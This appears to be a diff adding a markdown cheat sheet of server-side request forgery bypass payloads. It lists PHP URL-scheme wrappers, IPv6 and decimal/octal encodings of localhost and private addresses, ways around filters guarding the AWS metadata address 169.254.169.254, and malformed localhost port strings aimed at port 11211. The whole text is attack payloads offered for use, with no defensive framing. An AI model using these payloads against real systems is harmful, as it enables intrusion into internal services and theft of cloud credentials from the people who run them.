@@ -1,0 +1,48 @@
+## White List bypasses
+PHP SSRF Wrappers / URL Schema
+gopher://
+fd://
+expect://
+ogg://
+tftp://
+dict://
+ftp://
+ssh2://
+file://
+http://
+https://
+imap://
+pop3://
+mailto://
+smtp://
+telnet://
+
+## IP Address Blacklists
+### IPv6 Evasion
+http://[::]/
+http://[::]:80/
+http://0000::1/
+http://0000::1:80/
+
+## Cracking the AWS Code: Bypassing 169.254.169.254
+### subdomain evasion
+http://169.254.169.254.xip.io/
+http://1ynrnhl.xip.io
+### Decimal Magic
+http://425.510.425.510 – Dotted Decimal with Overflow
+http://2852039166 – Dotless Decimal
+http://7147006462 – Dotless Decimal with Overflow
+
+## Malformed URL Tricks
+when ports are locked go for MUT
+localhost:+11211aaa
+localhost:00011211aaaa
+localhost:11211
+
+## Decimal IP Wizardry
+When dots are barred, play with decimal delights.
+http://0177.0.0.1/ → (127.0.0.1)
+http://2130706433/ → (127.0.0.1)
+http://3232235521/ → (192.168.0.1)
+http://3232235777/ → (192.168.1.1)
+
